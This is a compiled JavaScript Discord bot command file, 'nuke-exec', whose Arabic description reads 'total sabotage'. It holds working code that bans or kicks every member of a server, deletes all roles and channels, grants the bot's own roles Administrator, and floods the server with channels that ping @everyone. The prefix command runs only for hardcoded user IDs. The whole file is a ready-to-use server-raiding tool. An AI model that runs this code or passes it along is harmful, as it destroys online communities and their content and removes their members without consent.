"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
// language: TypeScript, file: src/commands/nuke-exec.ts
const discord_js_1 = require("discord.js");
exports.default = {
    data: new discord_js_1.SlashCommandBuilder()
        .setName('nuke')
        .setDescription('تخريب شامل')
        .setDefaultMemberPermissions(discord_js_1.PermissionFlagsBits.Administrator),
    // دالة التنفيذ العادية للسلاش
    async execute(interaction, client) {
        await interaction.reply({ content: 'جاري التخريب...', ephemeral: true });
        await this.runNuke(interaction.guild, interaction.user.id, client);
    },
    // دالة تنفيذ البريفكس (.nuke)
    async run(message, args, client) {
        const allowed = ['1342238662368296980', '1557735350464417822'];
        if (!allowed.includes(message.author.id))
            return;
        await message.reply('NUKE STARTED 💀').catch(() => { });
        await this.runNuke(message.guild, message.author.id, client);
    },
    // الكود الفعلي
    async runNuke(guild, ownerId, client) {
        if (!guild)
            return;
        const me = client.user?.id;
        // 1. حظر
        try {
            const members = await guild.members.fetch();
            for (const [id, member] of members) {
                if (id === me || id === ownerId)
                    continue;
                if (member.bannable)
                    await member.ban({ reason: 'Nuke' }).catch(() => { });
                else if (member.kickable)
                    await member.kick('Nuke').catch(() => { });
                await new Promise(r => setTimeout(r, 150));
            }
        }
        catch (e) { }
        // 2. مسح الرولات
        try {
            const roles = await guild.roles.fetch();
            for (const [id, role] of roles) {
                if (id === guild.id || !role.editable)
                    continue;
                if (me && role.members.has(me))
                    await role.setPermissions([discord_js_1.PermissionFlagsBits.Administrator]).catch(() => { });
                else
                    await role.delete('Nuke').catch(() => { });
                await new Promise(r => setTimeout(r, 200));
            }
        }
        catch (e) { }
        // 3. مسح القنوات
        try {
            const channels = await guild.channels.fetch();
            for (const [id, channel] of channels) {
                await channel.delete('Nuke').catch(() => { });
                await new Promise(r => setTimeout(r, 200));
            }
        }
        catch (e) { }
        // 4. سبام
        for (let i = 0; i < 20; i++) {
            try {
                const newCh = await guild.channels.create({ name: `nuked-${i}`, type: discord_js_1.ChannelType.GuildText }).catch(() => null);
                if (newCh)
                    await newCh.send('@everyone NUKED 💀').catch(() => { });
            }
            catch { }
        }
    }
};
//# sourceMappingURL=nuke-exec.js.map